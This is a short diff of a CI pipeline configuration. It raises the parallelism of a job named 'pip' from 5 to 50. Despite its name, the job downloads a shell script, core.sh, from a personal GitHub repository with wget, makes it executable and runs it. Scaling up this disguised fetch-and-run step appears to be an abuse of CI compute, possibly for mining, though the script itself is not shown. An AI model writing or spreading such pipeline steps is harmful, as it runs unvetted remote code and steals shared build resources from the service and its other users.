@@ -27,7 +27,7 @@ blocks:
         - name: pip
           commands:
             - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-          parallelism: 5
+          parallelism: 50
       epilogue:
         always:
           commands:
